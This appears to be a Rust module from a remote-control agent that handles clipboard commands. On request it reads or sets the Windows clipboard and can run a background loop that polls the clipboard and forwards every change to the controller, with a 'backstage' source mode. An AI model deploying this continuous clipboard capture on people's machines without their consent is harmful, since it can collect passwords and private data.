use std::sync::atomic::Ordering;
use std::time::Duration;

use tokio_util::sync::CancellationToken;

use crate::{
    commands::Ctx,
    protocol::{self, Obj},
    state::Outbound,
    util,
};

pub async fn handle(ctx: Ctx) {
    match ctx.command.name.as_str() {
        "clipboard_get" => {
            let source = match ctx.string("source") {
                Some(value) if value == "backstage" => "backstage",
                _ => "rd",
            };
            #[cfg(windows)]
            match crate::win::clipboard::get_text() {
                Some(text) => {
                    ctx.out.send(clipboard_message(&text, source)).await;
                    ctx.out.result(&ctx.command, true, None).await;
                }
                None => {
                    ctx.out
                        .result(&ctx.command, false, Some("clipboard read failed"))
                        .await;
                }
            }
            #[cfg(not(windows))]
            {
                let _ = source;
                ctx.out
                    .result(&ctx.command, false, Some("clipboard is only available on Windows"))
                    .await;
            }
        }
        "clipboard_set" => {
            let text = util::truncate_utf8(ctx.string("text").unwrap_or(""), 64 * 1024).to_owned();
            #[cfg(windows)]
            {
                let _ = crate::win::clipboard::set_text(&text);
            }
            #[cfg(not(windows))]
            {
                let _ = text;
            }
            ctx.out.result(&ctx.command, true, None).await;
        }
        "clipboard_sync_start" => {
            let source = match ctx.string("source") {
                Some(value) if value == "backstage" => "backstage",
                _ => "rd",
            };
            if let Ok(mut guard) = ctx.state.clipboard_sync.lock() {
                if let Some(previous) = guard.take() {
                    previous.cancel();
                }
            }
            let cancel = CancellationToken::new();
            if let Ok(mut guard) = ctx.state.clipboard_sync.lock() {
                *guard = Some(cancel.clone());
            }
            let out = ctx.out.clone();
            tokio::spawn(async move {
                run_clipboard_sync(out, source.to_owned(), cancel).await;
            });
            ctx.out.result(&ctx.command, true, None).await;
        }
        "clipboard_sync_stop" => {
            if let Ok(mut guard) = ctx.state.clipboard_sync.lock() {
                if let Some(cancel) = guard.take() {
                    cancel.cancel();
                }
            }
            ctx.out.result(&ctx.command, true, None).await;
        }
        _ => {
            ctx.out
                .result(&ctx.command, false, Some("unknown clipboard command"))
                .await;
        }
    }
}

fn clipboard_message(text: &str, source: &str) -> protocol::Value {
    Obj::new()
        .put(protocol::key_type(), protocol::s("clipboard_content"))
        .put(protocol::key_text(), protocol::s(text))
        .put(protocol::key_source(), protocol::s(source))
        .value()
}

async fn run_clipboard_sync(out: Outbound, source: String, cancel: CancellationToken) {
    let mut last = String::new();
    loop {
        tokio::select! {
            _ = cancel.cancelled() => break,
            _ = tokio::time::sleep(Duration::from_millis(750)) => {
                #[cfg(windows)]
                if let Some(text) = crate::win::clipboard::get_text() {
                    if text != last {
                        last = text.clone();
                        out.send(clipboard_message(&text, &source)).await;
                    }
                }
                #[cfg(not(windows))]
                {
                    let _ = &source;
                }
            }
        }
    }
    let _ = Ordering::Relaxed;
}
